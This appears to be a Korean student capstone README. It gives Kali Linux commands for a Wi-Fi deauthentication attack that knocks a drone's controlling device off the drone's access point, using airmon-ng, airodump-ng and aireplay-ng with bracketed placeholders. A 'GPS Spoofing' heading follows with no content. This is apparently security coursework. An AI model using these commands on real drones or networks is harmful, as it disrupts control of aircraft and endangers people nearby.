캡스톤디자인I 코드
=================


1.인증해제 공격
---------------

무선 랜카드가 장착된 Kali Linux 환경에서 행한다.

> 불필요한 프로세스를 종료하고, 공격에 이용할 무선랜의 이름을 확인한다.
>
>```bash
>airmon-ng check kill
>iwconfig
>```


> 무선랜을 모니터 모드로 전환하고, 드론 AP의 패킷을 수집한다.
>
>```bash
>airmon-ng start [무선랜 이름]
>airodump-ng [무선랜 이름] --essid-regex [드론의 MAC주소] -w [저장 파일명]
>```


>수집한 패킷에서 제어 기기의 MAC주소를 확인하고, 인증해제 공격을 실행한다.
>
>```bash
>iwconfig [무선랜 이름] channel [드론 AP의 채널]
>aireplay-ng --deauth [공격 시간] -a [드론의 MAC주소] -c [제어 기기의 MAC주소] [무선랜 이름]
>```



2.GPS Spoofing
---------------


